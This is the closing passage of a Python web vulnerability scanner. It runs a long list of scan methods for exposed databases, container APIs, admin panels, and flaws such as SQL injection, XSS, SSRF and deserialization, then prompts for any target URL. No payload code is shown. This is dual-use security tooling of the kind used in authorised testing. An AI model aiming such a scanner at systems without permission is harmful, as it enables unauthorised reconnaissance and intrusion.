        database_scans = [
            (lambda: self.scan_elasticsearch(), "Scanning Elasticsearch exposure..."),
            (lambda: self.scan_mongodb(), "Scanning MongoDB exposure..."),
            (lambda: self.scan_redis(), "Scanning Redis exposure..."),
            (lambda: self.scan_memcached(), "Scanning Memcached exposure...")
        ]

        container_scans = [
            (lambda: self.scan_docker(), "Scanning Docker API..."),
            (lambda: self.scan_kubernetes(), "Scanning Kubernetes API..."),
            (lambda: self.scan_jenkins(), "Scanning Jenkins..."),
            (lambda: self.scan_grafana(), "Scanning Grafana..."),
            (lambda: self.scan_prometheus(), "Scanning Prometheus..."),
            (lambda: self.scan_rabbitmq(), "Scanning RabbitMQ...")
        ]

        cms_file_scans = [
            (lambda: self.scan_kibana(), "Scanning Kibana..."),
            (lambda: self.scan_consul(), "Scanning Consul..."),
            (lambda: self.scan_vault(), "Scanning Vault..."),
            (lambda: self.scan_etcd(), "Scanning etcd..."),
            (lambda: self.scan_swagger(), "Scanning Swagger UI..."),
            (lambda: self.scan_phpmyadmin(), "Scanning phpMyAdmin..."),
            (lambda: self.scan_wordpress_files(), "Scanning WordPress files..."),
            (lambda: self.scan_drupal_files(), "Scanning Drupal files...")
        ]

        vulnerability_scans = [
            (lambda: self.scan_sql_injection(self.target_url), "SQL Injection scan"),
            (lambda: self.scan_xss(self.target_url), "XSS scan"),
            (lambda: self.scan_security_headers(self.target_url), "Security headers scan"),
            (lambda: self.scan_directory_listing(self.target_url), "Directory listing scan"),
            (lambda: self.scan_http_methods(self.target_url), "HTTP methods scan"),
            (lambda: self.scan_sensitive_data_exposure(self.target_url), "Sensitive data exposure scan"),
            (lambda: self.scan_broken_authentication(self.target_url), "Authentication weak page scan"),
            (lambda: self.scan_csrf(self.target_url), "CSRF scan"),
            (lambda: self.scan_file_inclusion(self.target_url), "File inclusion scan"),
            (lambda: self.scan_command_injection(self.target_url), "Command injection scan"),
            (lambda: self.scan_ssrf(self.target_url), "SSRF scan"),
            (lambda: self.scan_xml_external_entity(self.target_url), "XXE scan"),
            (lambda: self.scan_insecure_deserialization(self.target_url), "Deserialization scan"),
            (lambda: self.scan_server_info_disclosure(self.target_url), "Server info disclosure scan"),
            (lambda: self.scan_cors_misconfiguration(self.target_url), "CORS misconfiguration scan"),
            (lambda: self.scan_jwt_issues(self.target_url), "JWT issues scan"),
            (lambda: self.scan_cache_control(self.target_url), "Cache control scan"),
            (lambda: self.scan_cookie_security(self.target_url), "Cookie security scan"),
            (lambda: self.scan_clickjacking(self.target_url), "Clickjacking scan"),
            (lambda: self.scan_open_redirect(self.target_url), "Open redirect scan"),
            (lambda: self.scan_host_header_injection(self.target_url), "Host header injection scan"),
            (lambda: self.scan_http_parameter_pollution(self.target_url), "HTTP parameter pollution scan"),
            (lambda: self.scan_content_spoofing(self.target_url), "Content spoofing scan"),
            (lambda: self.scan_webdav(self.target_url), "WebDAV scan"),
            (lambda: self.scan_robots_txt(self.target_url), "Robots.txt scan"),
            (lambda: self.scan_sitemap_xml(self.target_url), "Sitemap.xml scan"),
            (lambda: self.scan_backup_files(self.target_url), "Backup files scan"),
            (lambda: self.scan_config_files(self.target_url), "Config files scan"),
            (lambda: self.scan_log_files(self.target_url), "Log files scan"),
            (lambda: self.scan_admin_interfaces(self.target_url), "Admin interfaces scan"),
            (lambda: self.scan_cms_specific(self.target_url), "CMS specific scan"),
            (lambda: self.scan_api_endpoints(self.target_url), "API endpoints scan"),
            (lambda: self.scan_webshells(self.target_url), "Webshell scan"),
            (lambda: self.scan_http_request_smuggling(self.target_url), "HTTP request smuggling scan"),
            (lambda: self.scan_prototype_pollution(self.target_url), "Prototype pollution scan"),
            (lambda: self.scan_graphql(self.target_url), "GraphQL scan"),
            (lambda: self.scan_websocket(self.target_url), "WebSocket scan"),
            (lambda: self.scan_web_cache_deception(self.target_url), "Web cache deception scan"),
            (lambda: self.scan_dom_based_xss(self.target_url), "DOM-based XSS scan"),
            (lambda: self.scan_crlf_injection(self.target_url), "CRLF injection scan"),
            (lambda: self.scan_server_side_template_injection(self.target_url), "SSTI scan"),
            (lambda: self.scan_race_condition(self.target_url), "Race condition scan"),
            (lambda: self.scan_common_files(self.target_url), "Common files scan"),
            (lambda: self.scan_http_methods_extended(self.target_url), "Extended HTTP methods scan"),
            (lambda: self.scan_cors_extended(self.target_url), "Extended CORS scan"),
            (lambda: self.scan_ssrf_extended(self.target_url), "Extended SSRF scan"),
            (lambda: self.scan_xml_injection(self.target_url), "XML injection scan"),
            (lambda: self.scan_json_injection(self.target_url), "JSON injection scan"),
            (lambda: self.scan_ldap_injection(self.target_url), "LDAP injection scan"),
            (lambda: self.scan_xpath_injection(self.target_url), "XPath injection scan"),
            (lambda: self.scan_header_injection(self.target_url), "Header injection scan"),
            (lambda: self.scan_email_injection(self.target_url), "Email injection scan"),
            (lambda: self.scan_orm_injection(self.target_url), "ORM injection scan"),
            (lambda: self.scan_deserialization(self.target_url), "Java deserialization scan"),
            (lambda: self.scan_oauth_flaws(self.target_url), "OAuth flaw scan"),
            (lambda: self.scan_jwt_flaws(self.target_url), "JWT flaw scan"),
            (lambda: self.scan_saml_flaws(self.target_url), "SAML flaw scan")
        ]

        # Create a professional progress bar
        with Progress(
            SpinnerColumn(),
            BarColumn(bar_width=None),
            "[progress.percentage]{task.percentage:>3.0f}%",
            TimeElapsedColumn(),
            TextColumn("{task.description}"),
            transient=True
        ) as progress:
            total_tasks = (
                len(infrastructure_scans) +
                len(database_scans) +
                len(container_scans) +
                len(cms_file_scans) +
                len(vulnerability_scans) + 1  # +1 for crawling
            )
            overall_task = progress.add_task("[bold magenta]Overall Scan Progress...", total=total_tasks)

            # Run infrastructure scans
            for scan, desc in infrastructure_scans:
                progress.console.log(f"[cyan] {desc}")
                scan()
                progress.advance(overall_task)

            # Run database scans
            for scan, desc in database_scans:
                progress.console.log(f"[cyan] {desc}")
                scan()
                progress.advance(overall_task)

            # Run container and service scans
            for scan, desc in container_scans:
                progress.console.log(f"[cyan] {desc}")
                scan()
                progress.advance(overall_task)

            # Run CMS and file scans
            for scan, desc in cms_file_scans:
                progress.console.log(f"[cyan] {desc}")
                scan()
                progress.advance(overall_task)

            # Run vulnerability scans
            for scan, desc in vulnerability_scans:
                progress.console.log(f"[cyan] {desc}")
                scan()
                progress.advance(overall_task)

            # Crawl the website
            progress.console.log("[cyan]Crawling website...")
            self.crawl(self.target_url, progress)
            progress.advance(overall_task)

        console.print("[bold cyan]\n[+] Scan completed.[/bold cyan]")
        self.display_results()


# Run the scanner
if __name__ == "__main__":
    banner = """
    ███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ██╗    ████████╗██████╗ ██╗██╗  ██╗███████╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██║    ╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
    ███████╗███████║███████║██║  ██║██║  ██║██║       ██║   ██████╔╝██║█████╔╝ █████╗  
    ╚════██║██╔══██║██╔══██║██║  ██║██║  ██║██║       ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
    ███████║██║  ██║██║  ██║██████╔╝██████╔╝███████╗   ██║   ██║  ██║██║██║  ██╗███████╗
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
                                                                                        
    ███████╗███████╗ ██████╗ ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗██████╗ 
    ██╔════╝██╔════╝██╔═══██╗██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██╔══██╗
    █████╗  ███████╗██║   ██║██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║█████╗  ██████╔╝
    ██╔══╝  ╚════██║██║   ██║██║   ██║   ██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗
    ██║     ███████║╚██████╔╝╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║███████╗██║  ██║
    ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
    """
    console.print(f"[bold red]{banner}[/bold red]")
    console.print("[bold cyan]Advanced Web Security Scanner[/bold cyan]")
    console.print("[bold yellow]Version 2.0 | By NVRK SAI KAMESH YADAVALLI[/bold yellow]\n")
    target = input("Enter target website (e.g., https://example.com): ")
    scanner = WebSecurityScanner(target)
    scanner.run()